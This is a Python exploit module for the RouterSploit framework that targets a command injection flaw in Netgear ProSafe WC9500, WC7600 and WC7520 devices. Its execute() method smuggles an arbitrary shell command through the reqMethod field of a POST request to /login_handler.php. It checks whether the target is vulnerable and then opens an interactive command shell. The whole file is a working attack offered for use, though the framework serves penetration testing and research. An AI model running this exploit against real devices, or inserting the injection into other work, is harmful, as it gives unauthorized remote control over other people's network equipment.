import re
from routersploit.core.exploit import *
from routersploit.core.http.http_client import HTTPClient


class Exploit(HTTPClient):
    __info__ = {
        "name": "Netgear ProSafe RCE",
        "description": "Module exploits remote command execution vulnerability in Netgear ProSafe "
                       "WC9500, WC7600, WC7520 devices. If the target is vulnerable command shell is invoked.",
        "authors": (
            "Andrei Costin <andrei[at]firmware.re>",  # vulnerability discovery
            "Marcin Bury <marcin[at]threat9.com>",  # routersploit module
        ),
        "references": (
            "http://firmware.re/vulns/acsa-2015-002.php",
            "https://www.blackhat.com/docs/asia-16/materials/asia-16-Costin-Automated-Dynamic-Firmware-Analysis-At-Scale-A-Case-Study-On-Embedded-Web-Interfaces.pdf",
        ),
        "devices": (
            "Netgear ProSafe WC9500",
            "Netgear ProSafe WC7600",
            "Netgear ProSafe WC7520",
        )
    }

    target = OptIP("", "Target IPv4 or IPv6 address")
    port = OptPort(80, "Target HTTP port")

    def run(self):
        if self.check():
            print_success("Target is vulnerable")
            print_status("Invoking command loop...")
            shell(self)
        else:
            print_error("Target is not vulnerable")

    def execute(self, cmd):
        mark = utils.random_text(32)
        headers = {'Content-Type': 'application/x-www-form-urlencoded'}
        data = 'reqMethod=json_cli_reqMethod" "json_cli_jsonData";{}; echo {}'.format(cmd, mark)

        response = self.http_request(
            method="POST",
            path="/login_handler.php",
            headers=headers,
            data=data
        )

        if response is None:
            return ""

        if mark in response.text:
            regexp = "(|.+?){}".format(mark)
            res = re.findall(regexp, response.text, re.DOTALL)

            if len(res):
                return res[0]

        return ""

    @mute
    def check(self):
        mark = utils.random_text(32)
        cmd = "echo {}".format(mark)

        response = self.execute(cmd)

        if mark in response:
            return True  # target is vulnerable

        return False  # target is not vulnerable
